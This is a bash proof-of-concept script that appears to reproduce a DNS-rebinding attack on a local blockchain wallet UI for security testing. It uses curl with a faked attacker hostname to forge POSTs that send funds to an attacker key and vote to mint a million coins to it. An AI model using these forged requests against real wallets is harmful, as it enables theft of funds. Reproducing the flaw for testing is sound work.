#!/usr/bin/env bash
# End-to-end DNS-rebinding reproduction against the PRODUCTION binaries (cmd/server + ui wallet).
# curl --resolve plays the browser AFTER the rebind: the attacker's name now resolves to 127.0.0.1,
# so curl sends Host: <attacker name>:<port> exactly like the browser would, and we add the Origin a
# browser attaches to a same-origin POST. No Sec-Fetch-* (not sent to a non-trustworthy http:// URL).
set -u
E2E=<scratch>/vwk-e2e
BIN=$E2E/bin
RUN=$(mktemp -d "$E2E/run.XXXX")
cd "$RUN"

pick_port() { while :; do p=$(( 20000 + RANDOM % 30000 )); (exec 3<>/dev/tcp/127.0.0.1/$p) 2>/dev/null || { echo $p; return; }; done; }
NODEPORT=$(pick_port); UIPORT=$(pick_port)

kv() { "$BIN/keygen" | awk -v k="$1" '$1==k":" {print $2}'; }
"$BIN/keygen" > founder.keys; "$BIN/keygen" > attacker.keys
FPUB=$(awk '$1=="publicKey:"{print $2}' founder.keys); FPRIV=$(awk '$1=="privateKey:"{print $2}' founder.keys)
APUB=$(awk '$1=="publicKey:"{print $2}' attacker.keys)

cat > node.json <<EOF
{ "networkId": "village", "listen": "127.0.0.1:$NODEPORT",
  "publicKey": "$FPUB", "privateKey": "$FPRIV",
  "transactionCost": "0.1", "timeoutMs": 3000, "minBlockIntervalMs": 200,
  "validators": [ { "publicKey": "$FPUB", "power": 1 } ],
  "genesis": [ { "publicKey": "$FPUB", "name": "founder", "amount": "1000", "validatorNode": "$FPUB" } ] }
EOF
# The founder's wallet (demo layout: the sole validator is also the wallet account).
printf '{ "publicKey": "%s", "privateKey": "%s" }\n' "$FPUB" "$FPRIV" > wallet.json
chmod 600 wallet.json

"$BIN/server" -config node.json > node.log 2>&1 &
NODEPID=$!
"$BIN/wallet" -node "http://127.0.0.1:$NODEPORT" -network village -wallet "$RUN/wallet.json" -listen "127.0.0.1:$UIPORT" < /dev/null > wallet.log 2>&1 &
UIPID=$!
trap 'kill $NODEPID $UIPID 2>/dev/null' EXIT
for i in $(seq 1 50); do curl -s -o /dev/null "http://127.0.0.1:$UIPORT/" && break; sleep 0.1; done

EVIL="rebind.attacker.example"
B=( --resolve "$EVIL:$UIPORT:127.0.0.1" )   # the post-rebind DNS answer
echo "ports node=$NODEPORT ui=$UIPORT; founder=${FPUB:0:12}… attacker=${APUB:0:12}…"

echo "--- control: classic cross-site POST (Sec-Fetch-Site: cross-site, foreign Origin, Host 127.0.0.1)"
curl -s -o /dev/null -w '%{http_code}\n' -H "Sec-Fetch-Site: cross-site" -H "Origin: http://$EVIL" \
  --data-urlencode "to=$APUB" -d amount=1 "http://127.0.0.1:$UIPORT/send"

echo "--- rebound read: GET / with Host $EVIL:$UIPORT"
curl -s "${B[@]}" -w '\nHTTP %{http_code}\n' "http://$EVIL:$UIPORT/" | grep -o -E 'HTTP [0-9]+|[0-9]+\.[0-9]{2}' | head -3

echo "--- rebound POST /send (browser header set after rebind: Host+Origin = attacker name, no Sec-Fetch-*)"
curl -s -D - -o /dev/null "${B[@]}" -H "Origin: http://$EVIL:$UIPORT" \
  --data-urlencode "to=$APUB" -d amount=500 "http://$EVIL:$UIPORT/send" | grep -i -E '^HTTP|^Location' | sed 's/%20/ /g'

echo "--- rebound POST /admin/reassignment (validator wallet: vote to mint 1000000 to the attacker)"
curl -s -D - -o /dev/null "${B[@]}" -H "Origin: http://$EVIL:$UIPORT" -H "Sec-Fetch-Site: same-origin" \
  --data-urlencode "account=$APUB" -d amount=1000000 "http://$EVIL:$UIPORT/admin/reassignment" | grep -i -E '^HTTP|^Location' | sed 's/%20/ /g'

sleep 3
echo "--- committed ledger (node /hdls/accounts):"
curl -s "http://127.0.0.1:$NODEPORT/hdls/accounts" | python3 -I -c '
import json,sys
for a in json.load(sys.stdin): print(" ", a.get("Name") or a.get("name") or "-", (a.get("PublicKey") or a.get("publicKey"))[:12]+"…", a.get("Amount") or a.get("amount"))'
curl -s "http://127.0.0.1:$NODEPORT/hdls/status"; echo
echo "run dir: $RUN"
